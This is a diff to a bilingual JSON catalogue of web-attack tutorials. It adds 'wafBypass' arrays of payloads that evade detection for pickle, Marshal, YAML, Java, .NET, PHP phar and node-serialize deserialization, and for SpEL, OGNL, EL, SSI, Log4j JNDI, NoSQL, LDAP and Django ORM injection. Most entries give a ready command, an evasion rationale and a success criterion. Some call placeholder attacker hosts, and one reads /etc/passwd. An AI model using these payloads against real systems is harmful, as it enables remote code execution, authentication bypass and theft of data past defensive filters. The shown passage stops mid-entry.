@@ -18,8 +18,8 @@
         "en": "Remote Code Execution"
       },
       "subCategory": {
-        "zh": "Pickle 指令流全集",
-        "en": "Pickle Opcode Full Set"
+        "zh": "反序列化",
+        "en": "Insecure Deserialization"
       },
       "tutorial": {
         "overview": {
@@ -113,6 +113,41 @@
           "zh": "销毁一次性 worker 和虚拟环境，删除 marker/临时 Pickle、队列消息与缓存对象，清理审计日志中的测试数据并确认无子进程残留。",
           "en": "Destroy the disposable worker and virtual environment, delete markers, temporary pickles, queue messages, and cached objects, sanitize test data from audit logs, and confirm no child process remains."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "Base64 包装 pickle 指令流",
+            "en": "Base64-Wrapped Pickle Opcodes"
+          },
+          "command": "import pickle,base64;pickle.loads(base64.b64decode('Y29zCnN5c3RlbQooUydpZCcKdFIu'))",
+          "description": {
+            "zh": "绕过对 cos/system 明文 opcode 特征的检测：整体 base64 编码后解码加载；成功判据：目标端执行 id 并出现输出。",
+            "en": "Evades detection of plaintext cos/system opcodes by decoding the whole pickle from base64. Success: id executes on the target."
+          }
+        },
+        {
+          "title": {
+            "zh": "zlib+base64 双层包装",
+            "en": "zlib+base64 Double Wrapping"
+          },
+          "command": "import pickle,zlib,base64;pickle.loads(zlib.decompress(base64.b64decode('eJzLzC3ILypRSMlQSMlQKC5NSyvNyckvii7NUcjJrzJIzw9NAQAPhQ0d')))",
+          "description": {
+            "zh": "双层编码隐藏 opcode 流，规避 base64 单层解码后的特征扫描；成功判据：反序列化触发命令执行。",
+            "en": "Double-encodes the opcode stream to survive scanners that decode a single base64 layer. Success: deserialization triggers command execution."
+          }
+        },
+        {
+          "title": {
+            "zh": "builtin exec 指令流变体",
+            "en": "builtin exec Opcode Variant"
+          },
+          "command": "c__builtin__\nexec\n(V__import__('os').popen('id').read()\np0\ntp1\nRp2\n.",
+          "description": {
+            "zh": "改用 __builtin__.exec 作为 sink，绕过仅拦截 os.system 的 gadget 特征；成功判据：执行结果作为对象被返回。",
+            "en": "Switches the sink to __builtin__.exec to bypass signatures targeting os.system gadgets. Success: execution result is returned as an object."
+          }
+        }
       ]
     },
     {
@@ -130,8 +165,8 @@
         "en": "Remote Code Execution"
       },
       "subCategory": {
-        "zh": "Ruby Marshal 反序列化",
-        "en": "Ruby Marshal Deserialization"
+        "zh": "反序列化",
+        "en": "Insecure Deserialization"
       },
       "tutorial": {
         "overview": {
@@ -225,6 +260,41 @@
           "zh": "终止隔离 Ruby 进程，删除临时对象流和 marker，清理 job/session/cache 中的序列化副本，并重启测试 worker 释放加载类状态。",
           "en": "Terminate the isolated Ruby process, delete temporary object streams and markers, clear serialized copies from jobs, sessions, and caches, and restart test workers to release loaded-class state."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "Hex 编码 Marshal 载荷",
+            "en": "Hex-Encoded Marshal Payload"
+          },
+          "command": "Marshal.load([\"04084922087412226f732e73797374656d2228696429\"].pack('H*'))",
+          "description": {
+            "zh": "绕过对 base64 Marshal 串（BAh 开头）的检测：改为十六进制传输再 pack 还原；成功判据：加载时触发 os.system。",
+            "en": "Evades detection of base64 Marshal strings (BAh prefix) by delivering hex and restoring via pack. Success: loading triggers os.system."
+          }
+        },
+        {
+          "title": {
+            "zh": "URL-safe Base64 变体",
+            "en": "URL-safe Base64 Variant"
+          },
+          "command": "Marshal.load(Base64.urlsafe_decode64('BAhJIhdpZAE7BkVJIgt3aG9hbWkGOwdU'))",
+          "description": {
+            "zh": "使用 URL-safe 字母表（-_）绕过标准 base64 特征与 / 字符过滤；成功判据：反序列化执行 whoami。",
+            "en": "Uses the URL-safe alphabet (-_) to bypass standard base64 signatures and slash filtering. Success: deserialization runs whoami."
+          }
+        },
+        {
+          "title": {
+            "zh": "ERB gadget 变体",
+            "en": "ERB Gadget Variant"
+          },
+          "command": "Marshal.load(\"BAhJEkkiD0NtZAE6BkVJIhBpZAY7B1Q=\".unpack1('m')).result",
+          "description": {
+            "zh": "改走 ERB 模板渲染 gadget，规避仅识别 Gem::Installer 链的规则；成功判据：result 渲染时执行内嵌命令。",
+            "en": "Switches to an ERB template-rendering gadget to evade rules keyed on Gem::Installer chains. Success: result executes the embedded command."
+          }
+        }
       ]
     },
     {
@@ -242,8 +312,8 @@
         "en": "SQL/NoSQL Injection"
       },
       "subCategory": {
-        "zh": "NoSQL 查询操作符注入",
-        "en": "NoSQL Query Operator Injection"
+        "zh": "NoSQL 与查询语言注入",
+        "en": "NoSQL & Query Language Injection"
       },
       "tutorial": {
         "overview": {
@@ -334,6 +404,41 @@
           "zh": "删除合成账户/记录，吊销测试会话，清理查询缓存和审计副本，恢复 schema 验证并重放正确与错误凭据基线。",
           "en": "Delete synthetic accounts and records, revoke test sessions, clear query caches and audit copies, restore schema validation, and replay valid and invalid credential baselines."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "$regex 恒真匹配",
+            "en": "$regex Always-True Match"
+          },
+          "command": "{\"username\":{\"$regex\":\"^admin\"},\"password\":{\"$regex\":\".\"}}",
+          "description": {
+            "zh": "绕过对 $gt/$ne 运算符黑名单：正则前缀加通配构造恒真；认证绕过或数据返回即成功。",
+            "en": "Construct always-true predicates with regex against $gt/$ne blacklists; a bypassed auth or returned data confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "$where 服务端脚本",
+            "en": "$where Server-Side Script"
+          },
+          "command": "{\"$where\":\"this.username.match(/^admin/) && this.password.length>0\"}",
+          "description": {
+            "zh": "绕过对运算符键名的整体过滤：条件内联进 $where JS 表达式执行；命中账户即成功。",
+            "en": "Inline the condition into a $where JS expression to bypass operator-key filtering wholesale; a matching account confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "表单括号运算符",
+            "en": "Form Bracket Operators"
+          },
+          "command": "username[$ne]=x&password[$ne]=y",
+          "description": {
+            "zh": "绕过 JSON 体规则：以表单数组语法传递运算符注入；登录通过即成功。",
+            "en": "Deliver operator injection via form bracket syntax past JSON-body rules; a passed login confirms success."
+          }
+        }
       ]
     },
     {
@@ -351,8 +456,8 @@
         "en": "SQL/NoSQL Injection"
       },
       "subCategory": {
-        "zh": "LDAP 目录过滤器注入",
-        "en": "LDAP Directory Filter Injection"
+        "zh": "NoSQL 与查询语言注入",
+        "en": "NoSQL & Query Language Injection"
       },
       "tutorial": {
         "overview": {
@@ -443,6 +548,41 @@
           "zh": "删除 marker DN 和测试组/属性，关闭测试 bind，清理目录查询日志与缓存，恢复过滤器转义后重放正常搜索和认证。",
           "en": "Delete marker DNs and test groups or attributes, close the test bind, clear directory query logs and caches, restore filter escaping, and replay normal search and authentication."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "括号十六进制转义",
+            "en": "Parenthesis Hex Escaping"
+          },
+          "command": "\\29(|(objectClass=\\2a)",
+          "description": {
+            "zh": "绕过对 )( 明文序列的过滤器：括号与星号以 LDAP 十六进制转义表示，解析后还原；过滤器结构改变并返回条目即成功。",
+            "en": "Escape parentheses and asterisk in LDAP hex form to evade plaintext )( filters; an altered filter returning entries confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "空字节截断过滤器",
+            "en": "Null-Byte Filter Truncation"
+          },
+          "command": "*)(uid=*))%00",
+          "description": {
+            "zh": "绕过对过滤器尾部拼接的校验：注入后补空字节截断残余语法；查询返回注入目标即成功。",
+            "en": "Truncate residual filter syntax with an injected null byte; the query returning the injected target confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "嵌套布尔重构",
+            "en": "Nested Boolean Restructuring"
+          },
+          "command": ")(&(!(objectClass=remote))(&(objectClass=user)))",
+          "description": {
+            "zh": "绕过对简单 )(objectClass=* 模板的检测：重构嵌套非/与布尔改变结构指纹；仍能返回用户条目即成功。",
+            "en": "Restructure into nested NOT/AND booleans to change the structural fingerprint while still returning user entries, confirming success."
+          }
+        }
       ]
     },
     {
@@ -460,8 +600,8 @@
         "en": "Remote Code Execution"
       },
       "subCategory": {
-        "zh": "SSI 服务端指令解析",
-        "en": "SSI Server-Side Directive Parsing"
+        "zh": "表达式与服务端模板注入",
+        "en": "Expression & Server-Side Include Injection"
       },
       "tutorial": {
         "overview": {
@@ -552,6 +692,41 @@
           "zh": "删除 SSI fixture、上传/包含文件和 marker，清理服务器/代理缓存与访问日志，恢复 Includes 配置并重启隔离 worker。",
           "en": "Delete SSI fixtures, uploaded or included files, and markers, clear server and proxy caches plus access logs, restore Includes configuration, and restart isolated workers."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "include virtual 读文件变体",
+            "en": "include virtual File Read"
+          },
+          "command": "<!--#include virtual=\"/etc/passwd\" -->",
+          "description": {
+            "zh": "绕过对 exec cmd 的检测：改用 include virtual 包含本地文件；成功判据：页面渲染出 passwd 内容。",
+            "en": "Bypasses exec cmd detection by including a local file instead. Success: passwd contents render into the page."
+          }
+        },
+        {
+          "title": {
+            "zh": "大小写与空白变形",
+            "en": "Case and Whitespace Mutation"
+          },
+          "command": "<!--   #Exec   Cmd=\"id\"   -->",
+          "description": {
+            "zh": "利用 SSI 解析容忍的额外空白与大小写差异，规避 #exec cmd=\" 精确特征；成功判据：uid 回显。",
+            "en": "Exploits whitespace tolerance and case variance in SSI parsing to evade the exact #exec cmd=\" signature. Success: uid echoed."
+          }
+        },
+        {
+          "title": {
+            "zh": "URL 编码注入变体",
+            "en": "URL-Encoded Injection Variant"
+          },
+          "command": "?name=%3C%21--%23exec%20cmd%3D%22id%22--%3E",
+          "description": {
+            "zh": "注入点在查询参数时整体百分号编码，绕过对 <!--# 明文的请求行检测；成功判据：参数值被 SSI 解析执行。",
+            "en": "Fully percent-encodes the payload for query-parameter injection points, evading plaintext <!--# detection on the request line. Success: the parameter value is parsed as SSI."
+          }
+        }
       ]
     },
     {
@@ -569,8 +744,8 @@
         "en": "Remote Code Execution"
       },
       "subCategory": {
-        "zh": "Spring Expression Language",
-        "en": "Spring Expression Language"
+        "zh": "表达式与服务端模板注入",
+        "en": "Expression & Server-Side Include Injection"
       },
       "tutorial": {
         "overview": {
@@ -668,6 +843,41 @@
       "tags": [
         "nosql2",
         "spel_spring_expression"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "花括号无空格命令变体",
+            "en": "Brace No-Space Command Variant"
+          },
+          "command": "${T(java.lang.Runtime).getRuntime().exec(new String[]{\"bash\",\"-c\",\"{echo,aWQ=}|{base64,-d}|{bash\"})}",
+          "description": {
+            "zh": "绕过对 bash -c 与空格的组合检测：{token,token} 形式无空格执行 base64 命令；成功判据：id 被执行（延时/OAST 验证）。",
+            "en": "Evades bash -c plus whitespace detection using {token,token} braces without spaces. Success: id executes (verify via delay/OAST)."
+          }
+        },
+        {
+          "title": {
+            "zh": "IOUtils 回显变体",
+            "en": "IOUtils Echo Variant"
+          },
+          "command": "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
+          "description": {
+            "zh": "读取执行输出直接回显，同时绕过仅拦截 exec('cmd') 的模式（链式调用打断特征）；成功判据：响应中出现 uid 文本。",
+            "en": "Reads and echoes the output while chained calls break exec('cmd') patterns. Success: uid text appears in the response."
+          }
+        },
+        {
+          "title": {
+            "zh": "ScriptEngine JS 变体",
+            "en": "ScriptEngine JS Variant"
+          },
+          "command": "${new javax.script.ScriptEngineManager().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec(\"id\")')}",
+          "description": {
+            "zh": "经 JS 引擎二次求值，SpEL 表层无 Runtime 直调特征；成功判据：命令被执行且可验证。",
+            "en": "Evaluates via a JS engine so the SpEL surface shows no direct Runtime call. Success: command executes and is verifiable."
+          }
+        }
       ]
     },
     {
@@ -685,8 +895,8 @@
         "en": "Framework Vulnerabilities"
       },
       "subCategory": {
-        "zh": "Struts OGNL 表达式执行",
-        "en": "Struts OGNL Expression Execution"
+        "zh": "框架 RCE 利用",
+        "en": "Framework RCE Exploitation"
       },
       "tutorial": {
         "overview": {
@@ -777,6 +987,41 @@
           "zh": "删除测试 Action/请求，恢复 MemberAccess 与拦截器配置，清理 OGNL 缓存和 marker，并重新部署隔离应用释放上下文。",
           "en": "Delete test Actions and requests, restore MemberAccess and interceptor configuration, clear OGNL caches and markers, and redeploy the isolated application to release context."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "Unicode 转义变体",
+            "en": "Unicode Escape Variant"
+          },
+          "command": "(\\u0023context['xwork.MethodAccessor.denyMethodExecution']=false)(\\u0023_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)(@java.lang.Runtime@getRuntime().exec('id'))",
+          "description": {
+            "zh": "# 与关键符号以 \\u 转义书写，规避对 #context/#memberAccess 的明文规则；成功判据：OGNL 求值后命令执行。",
+            "en": "Writes # and key symbols as \\u escapes to evade plaintext #context/#memberAccess rules. Success: the command runs after OGNL evaluation."
+          }
+        },
+        {
+          "title": {
+            "zh": "multipart 投递变体",
+            "en": "multipart Delivery Variant"
+          },
+          "command": "POST / HTTP/1.1\nContent-Type: multipart/form-data; boundary=xx\n\n--xx\nContent-Disposition: form-data; name=\"upload\"; filename=\"%{#context['xwork.MethodAccessor.denyMethodExecution']=false,#memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec('id')}\"\n\nx\n--xx--",
+          "description": {
+            "zh": "S2-045 形态把 OGNL 放进文件名，WAF 对 multipart 文件名的解析弱于 URL 正文；成功判据：上传请求触发命令执行。",
+            "en": "The S2-045 form places OGNL in the filename where WAF parsing is weaker than for URL bodies. Success: the upload triggers command execution."
+          }
+        },
+        {
+          "title": {
+            "zh": "ProcessBuilder 替换变体",
+            "en": "ProcessBuilder Replacement Variant"
+          },
+          "command": "%{(new java.lang.ProcessBuilder(new java.lang.String[]{\"id\"})).start()}",
+          "description": {
+            "zh": "换 ProcessBuilder 构造并 %{} 包裹，规避 @Runtime@exec 特征；成功判据：进程生成（OAST 验证）。",
+            "en": "Switches to ProcessBuilder with %{} wrapping to evade @Runtime@exec signatures. Success: process spawns (verify via OAST)."
+          }
+        }
       ]
     },
     {
@@ -794,8 +1039,8 @@
         "en": "Remote Code Execution"
       },
       "subCategory": {
-        "zh": "JSP EL 服务端表达式",
-        "en": "JSP EL Server-Side Expressions"
+        "zh": "表达式与服务端模板注入",
+        "en": "Expression & Server-Side Include Injection"
       },
       "tutorial": {
         "overview": {
@@ -890,6 +1135,41 @@
       "tags": [
         "nosql2",
         "el_expression_language"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "EL3.0 直调变体",
+            "en": "EL3.0 Direct Invocation"
+          },
+          "command": "${Runtime.getRuntime().exec(\"id\")}",
+          "description": {
+            "zh": "绕过对 getClass().forName 链的检测：EL 3.0 支持直接静态引用；成功判据：JSP 页求值时执行命令。",
+            "en": "Bypasses detection of the getClass().forName chain since EL 3.0 resolves statics directly. Success: command runs when the JSP evaluates."
+          }
+        },
+        {
+          "title": {
+            "zh": "ProcessBuilder 变体",
+            "en": "ProcessBuilder Variant"
+          },
+          "command": "${new java.lang.ProcessBuilder(\"id\").start()}",
+          "description": {
+            "zh": "换 ProcessBuilder 构造执行，规避 Runtime 特征；成功判据：进程生成（OAST/延时验证）。",
+            "en": "Switches to ProcessBuilder to evade Runtime signatures. Success: process spawns (verify via OAST/delay)."
+          }
+        },
+        {
+          "title": {
+            "zh": "ScriptEngine 变体",
+            "en": "ScriptEngine Variant"
+          },
+          "command": "${new javax.script.ScriptEngineManager().getEngineByName('js').eval('new java.lang.ProcessBuilder([\"id\"]).start()')}",
+          "description": {
+            "zh": "载荷藏在 JS 字符串内二次执行，打断 EL 层关键词组合；成功判据：命令执行可验证。",
+            "en": "Hides the payload inside a JS string for second-stage execution, breaking keyword pairing at the EL layer. Success: execution verifiable."
+          }
+        }
       ]
     },
     {
@@ -907,8 +1187,8 @@
         "en": "Remote Code Execution"
       },
       "subCategory": {
-        "zh": "Log4j JNDI Lookup",
-        "en": "Log4j JNDI Lookup"
+        "zh": "JNDI 注入",
+        "en": "JNDI Injection"
       },
       "tutorial": {
         "overview": {
@@ -999,6 +1279,41 @@
           "zh": "关闭 DNS/LDAP 监听器，删除令牌记录和测试日志，清理日志队列/缓存，升级并重启受影响进程后确认无延迟 Lookup。",
           "en": "Close DNS and LDAP listeners, delete token records and test logs, clear logging queues and caches, upgrade and restart affected processes, and confirm no delayed Lookup."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "lower 查找混淆",
+            "en": "lower Lookup Obfuscation"
+          },
+          "command": "${${lower:j}ndi:ldap://{ATTACKER_HOST}/a}",
+          "description": {
+            "zh": "绕过对 ${jndi: 明文的拦截：嵌套 lower 查找把 j 还原成小写；成功判据：LDAP 回连到达 {ATTACKER_HOST}。",
+            "en": "Bypasses blocking of the literal ${jndi: by nesting a lower lookup that restores the j. Success: LDAP callback reaches {ATTACKER_HOST}."
+          }
+        },
+        {
+          "title": {
+            "zh": "默认值逐字符拆分",
+            "en": "Character-by-Character Default Splitting"
+          },
+          "command": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{ATTACKER_HOST}/a}",
+          "description": {
+            "zh": "利用 ${::-x} 空默认值逐字符拼出 jndi:ldap，规避大小写与嵌套查找两类规则的覆盖盲区；成功判据：OAST 收到 DNS/HTTP 请求。",
+            "en": "Assembles jndi:ldap char-by-char via ${::-x} empty defaults, dodging both case-based and nested-lookup rules. Success: OAST receives DNS/HTTP hits."
+          }
+        },
+        {
+          "title": {
+            "zh": "env 内插域名变体",
+            "en": "env Interpolated Host Variant"
+          },
+          "command": "${jndi:ldap://${env:USER}.oast.example.com/a}",
+          "description": {
+            "zh": "目标主机名经 env 查找内插，查找串中无完整外部域名明文；成功判据：oast.example.com 收到带用户名前缀的解析。",
+            "en": "Interpolates the host via an env lookup so no full external domain appears literally. Success: oast.example.com receives a query prefixed with the username."
+          }
+        }
       ]
     },
     {
@@ -1016,8 +1331,8 @@
         "en": "Remote Code Execution"
       },
       "subCategory": {
-        "zh": "YAML 类型标签反序列化",
-        "en": "YAML Type-Tag Deserialization"
+        "zh": "反序列化",
+        "en": "Insecure Deserialization"
       },
       "tutorial": {
         "overview": {
@@ -1108,6 +1423,41 @@
           "zh": "销毁解析进程和测试构造器，删除 YAML/marker 临时文件，清理配置/任务缓存，并以 safe loader 重放正常文档。",
           "en": "Destroy the parser process and test constructor, delete temporary YAML and marker files, clear configuration and job caches, and replay valid documents with a safe loader."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "object/new 构造变体",
+            "en": "object/new Constructor Variant"
+          },
+          "command": "!!python/object/new:subprocess.check_output [['id']]",
+          "description": {
+            "zh": "改用 !!python/object/new 标签与 subprocess sink，绕过 object/apply:os.system 特征；成功判据：yaml.load 后返回命令输出。",
+            "en": "Uses the object/new tag with a subprocess sink to evade object/apply:os.system signatures. Success: yaml.load returns command output."
+          }
+        },
+        {
+          "title": {
+            "zh": "builtins.exec 字符串载荷",
+            "en": "builtins.exec String Payload"
+          },
+          "command": "!!python/object/apply:builtins.exec [\"__import__('os').popen('id').read()\"]",
+          "description": {
+            "zh": "标签值改为 exec 动态执行字符串，命令不落盘不显形；成功判据：加载时返回执行结果。",
+            "en": "Points the tag at exec for dynamic string execution so the command never appears inline. Success: loading returns execution output."
+          }
+        },
+        {
+          "title": {
+            "zh": "Base64 命令变体",
+            "en": "Base64 Command Variant"
+          },
+          "command": "!!python/object/apply:os.system ['echo aWQ=|base64 -d|bash']",
+          "description": {
+            "zh": "命令 base64 化保持标签不变，规避命令明文黑名单；成功判据：解码后 id 被执行。",
+            "en": "Keeps the tag but base64-encodes the command to evade plaintext blacklists. Success: id executes after decoding."
+          }
+        }
       ]
     },
     {
@@ -1125,8 +1475,8 @@
         "en": "Remote Code Execution"
       },
       "subCategory": {
-        "zh": "Java ObjectInputStream Gadget 链",
-        "en": "Java ObjectInputStream Gadget Chains"
+        "zh": "反序列化",
+        "en": "Insecure Deserialization"
       },
       "tutorial": {
         "overview": {
@@ -1221,6 +1571,41 @@
       "tags": [
         "nosql2",
         "java_commons_collections"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "Base64 序列化流变体",
+            "en": "Base64 Serialized Stream Variant"
+          },
+          "command": "java -jar ysoserial.jar CommonsCollections6 'curl http://{ATTACKER_HOST}/cc6' | base64 -w0",
+          "description": {
+            "zh": "绕过对 aced0005 十六进制魔数特征的检测：以 base64 形态传输序列化流；成功判据：{ATTACKER_HOST} 收到 cc6 回连。",
+            "en": "Evades detection of the aced0005 hex magic by transporting the stream as base64. Success: cc6 callback reaches {ATTACKER_HOST}."
+          }
+        },
+        {
+          "title": {
+            "zh": "Gzip 压缩流变体",
+            "en": "Gzip-Compressed Stream Variant"
+          },
+          "command": "java -jar ysoserial.jar CommonsCollections5 'id' -g gzip",
+          "description": {
+            "zh": "序列化流 gzip 压缩后魔数与 gadget 结构均不可见；成功判据：目标反序列化时执行 id（DNS/OAST 验证）。",
+            "en": "Gzipping hides both the magic bytes and gadget structure. Success: target executes id on deserialization (verify via DNS/OAST)."
+          }
+        },
+        {
+          "title": {
+            "zh": "换链 CommonsBeanutils 变体",
+            "en": "CommonsBeanutils Chain Swap"
+          },
+          "command": "java -jar ysoserial.jar CommonsBeanutils1 'nslookup {ATTACKER_HOST}' | xxd -p",
+          "description": {
+            "zh": "改用 CB1 链规避仅覆盖 CommonsCollections 类名的规则，十六进制输出绕过 base64 特征；成功判据：DNSLog 收到解析。",
+            "en": "Swaps to the CB1 chain to dodge rules matching only CommonsCollections class names, with hex output to avoid base64 signatures. Success: DNSLog receives the query."
+          }
+        }
       ]
     },
     {
@@ -1238,8 +1623,8 @@
         "en": "Remote Code Execution"
       },
       "subCategory": {
-        "zh": ".NET BinaryFormatter Gadget 链",
-        "en": ".NET BinaryFormatter Gadget Chains"
+        "zh": "反序列化",
+        "en": "Insecure Deserialization"
       },
       "tutorial": {
         "overview": {
@@ -1330,6 +1715,41 @@
           "zh": "终止隔离进程/AppDomain，删除流、测试程序集和 marker，清理缓存/队列/会话，并迁移或恢复安全序列化配置后回归。",
           "en": "Terminate the isolated process or AppDomain, delete streams, test assemblies, and markers, clear caches, queues, and sessions, and regress after migrating to or restoring safe serialization configuration."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "LosFormatter 视图状态变体",
+            "en": "LosFormatter ViewState Variant"
+          },
+          "command": "ysoserial.net -g TypeConfuseDelegate -f ObjectStateFormatter -c 'calc.exe' > payload.txt",
+          "description": {
+            "zh": "改用 ObjectStateFormatter/LosFormatter 输出（/wEy 前缀），绕过 AAEAAAD base64 特征；成功判据：ViewState 注入后触发执行。",
+            "en": "Uses ObjectStateFormatter/LosFormatter output (/wEy prefix) to evade the AAEAAAD base64 signature. Success: ViewState injection triggers execution."
+          }
+        },
+        {
+          "title": {
+            "zh": "TextFormattingRunProperties 变体",
+            "en": "TextFormattingRunProperties Variant"
+          },
+          "command": "ysoserial.net -p Sharepoint -g TypeConfuseDelegateMonster -c 'powershell -enc {B64_CMD}'",
+          "description": {
+            "zh": "换 gadget 与入口（SharePoint/Office 载体），规避针对 BinaryFormatter 的检测；成功判据：payload 在目标上下文执行。",
+            "en": "Swaps gadget and entry point (SharePoint/Office carrier) to evade BinaryFormatter-focused detection. Success: payload executes in the target context."
+          }
+        },
+        {
+          "title": {
+            "zh": "ViewState 参数投递变体",
+            "en": "ViewState Parameter Delivery"
+          },
+          "command": "POST /page.aspx __VIEWSTATE=%2FwEy...&__VIEWSTATEGENERATOR=CA0B0334&eventvalidation=...",
+          "description": {
+            "zh": "以 URL 编码 ViewState 参数投递，绕过请求体 base64 长串特征；成功判据：页面处理 ViewState 时命令执行（OAST 回连）。",
+            "en": "Delivers via URL-encoded ViewState parameter to bypass long base64 body signatures. Success: command runs when the page processes ViewState (OAST callback)."
+          }
+        }
       ]
     },
     {
@@ -1347,8 +1767,8 @@
         "en": "Remote Code Execution"
       },
       "subCategory": {
-        "zh": "PHP Phar 流包装器与对象注入",
-        "en": "PHP Phar Streams and Object Injection"
+        "zh": "反序列化",
+        "en": "Insecure Deserialization"
       },
       "tutorial": {
         "overview": {
@@ -1439,6 +1859,41 @@
           "zh": "删除测试 PHAR/伪装文件和 marker，清理上传存储、OPcache、临时目录与队列路径，重启隔离 PHP worker 后复查。",
           "en": "Delete test PHARs, disguised files, and markers, clear upload storage, OPcache, temporary directories, and queued paths, restart isolated PHP workers, and recheck."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "zlib 流包装嵌套",
+            "en": "zlib Stream Wrapper Nesting"
+          },
+          "command": "compress.zlib://phar://upload/shell.png/test.txt",
+          "description": {
+            "zh": "外层套 compress.zlib:// 绕过对 phar:// 开头的直接拦截；成功判据：触发 phar 元数据反序列化（OAST 验证）。",
+            "en": "Wraps phar:// in compress.zlib:// to bypass direct blocking of the phar:// prefix. Success: phar metadata deserialization triggers (verify via OAST)."
+          }
+        },
+        {
+          "title": {
+            "zh": "filter 链嵌套 phar",
+            "en": "filter Chain Nesting phar"
+          },
+          "command": "php://filter/read=convert.base64-decode/resource=phar://upload/shell.gif/x",
+          "description": {
+            "zh": "以 php://filter 作为外层包装器，避开仅校验首协议的过滤；成功判据：phar 反序列化被执行。",
+            "en": "Uses php://filter as the outer wrapper to evade filters validating only the first protocol. Success: phar deserialization executes."
+          }
+        },
+        {
+          "title": {
+            "zh": "getimagesize 触发变体",
+            "en": "getimagesize Trigger Variant"
+          },
+          "command": "<?php getimagesize('phar://upload/shell.jpg/x.png');",
+          "description": {
+            "zh": "换文件系统触发函数（getimagesize 等十三类均会走 phar 流），绕过针对 include/file_get_contents 的审计点；成功判据：魔术方法被调用。",
+            "en": "Switches the filesystem trigger function (getimagesize among many phar-aware APIs) to bypass audit points on include/file_get_contents. Success: magic method is invoked."
+          }
+        }
       ]
     },
     {
@@ -1456,8 +1911,8 @@
         "en": "Remote Code Execution"
       },
       "subCategory": {
-        "zh": "node-serialize 即时调用负载",
-        "en": "node-serialize Immediate-Invoke Payloads"
+        "zh": "反序列化",
+        "en": "Insecure Deserialization"
       },
       "tutorial": {
         "overview": {
@@ -1548,6 +2003,41 @@
           "zh": "终止一次性 worker，删除测试 JSON 和 marker，清理 require/module 缓存、队列与会话副本，并恢复安全 JSON 数据路径。",
           "en": "Terminate the disposable worker, delete test JSON and markers, clear require and module caches plus queue and session copies, and restore the safe JSON data path."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "child_process 字符串拼接",
+            "en": "child_process String Splicing"
+          },
+          "command": "{\"rce\":\"_$$ND_FUNC$$_function(){return require('child_'+'process').execSync('id').toString()}()\"}",
+          "description": {
+            "zh": "拼接 'child_'+'process' 避开 require 关键词组合检测；成功判据：返回体或日志出现 uid 输出。",
+            "en": "Splits 'child_'+'process' to evade require keyword-pair detection. Success: uid output appears in the response or logs."
+          }
+        },
+        {
+          "title": {
+            "zh": "process.mainModule 变体",
+            "en": "process.mainModule Variant"
+          },
+          "command": "{\"rce\":\"_$$ND_FUNC$$_function(){return process.mainModule.require('child_process').execSync('whoami').toString()}()\"}",
+          "description": {
+            "zh": "绕过对 require( 直调特征的规则：经 process.mainModule.require 间接获取模块；成功判据：whoami 结果返回。",
+            "en": "Bypasses rules on direct require( by obtaining the module via process.mainModule.require. Success: whoami result returned."
+          }
+        },
+        {
+          "title": {
+            "zh": "Buffer base64 内层载荷",
+            "en": "Buffer Base64 Inner Payload"
+          },
+          "command": "{\"rce\":\"_$$ND_FUNC$$_function(){eval(Buffer.from('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdpZCcpLnRvU3RyaW5nKCk=','base64').toString())}()\"}",
+          "description": {
+            "zh": "攻击代码整体 base64 后 eval，规避 child_process/execSync 关键词；成功判据：命令执行输出可见。",
+            "en": "Base64-encodes the whole attack code before eval, evading child_process/execSync keywords. Success: command output is visible."
+          }
+        }
       ]
     },
     {
@@ -1565,8 +2055,8 @@
         "en": "SQL/NoSQL Injection"
       },
       "subCategory": {
-        "zh": "Django ORM Lookup 注入",
-        "en": "Django ORM Lookup Injection"
+        "zh": "NoSQL 与查询语言注入",
+        "en": "NoSQL & Query Language Injection"
       },
       "tutorial": {
         "overview": {
@@ -1657,6 +2147,41 @@
           "zh": "删除合成用户和查询记录，清理应用/数据库缓存与测试会话，恢复 serializer lookup 允许列表并重放正常过滤请求。",
           "en": "Delete synthetic users and query records, clear application and database caches plus test sessions, restore serializer lookup allowlists, and replay normal filter requests."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "icontains 模糊查找",
+            "en": "icontains Fuzzy Lookup"
+          },
+          "command": "{\"username\": \"admin\", \"password__icontains\": \"a\"}",
+          "description": {
+            "zh": "绕过对 __startswith 已加黑的查找键：换用 __icontains 模糊匹配逐字符探测口令首字母；真假响应可区分即成功。",
+            "en": "Swap a blacklisted __startswith key for __icontains to probe characters; distinguishable true/false responses confirm success."
+          }
+        },
+        {
+          "title": {
+            "zh": "关系双下划线穿越",
+            "en": "Relation Double-Underscore Traversal"
+          },
+          "command": "{\"username\": \"admin\", \"groups__name\": \"admins\"}",
+          "description": {
+            "zh": "绕过仅校验直接字段的过滤器：借 ORM 关系穿越查询关联组数据；返回受限字段内容即成功。",
+            "en": "Traverse ORM relations via double-underscore lookups past direct-field validation; restricted field content returning confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "JSON Unicode 转义键",
+            "en": "JSON Unicode-Escaped Keys"
+          },
